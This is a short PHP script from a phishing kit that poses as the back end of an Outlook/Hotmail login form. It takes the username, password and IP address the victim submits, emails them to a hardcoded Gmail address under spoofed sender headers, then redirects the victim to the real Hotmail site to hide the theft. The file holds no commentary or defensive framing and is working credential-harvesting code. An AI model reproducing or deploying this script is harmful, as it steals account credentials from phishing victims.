<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------ ED Logz --------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "------------------ Created By M3RC1 --------------------\n";
$send = "macdon161@gmail.com";
$subject = "outlook.com";
$headers = "From: StarBoy<logs@edu.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://www.hotmail.com/");
	  

?>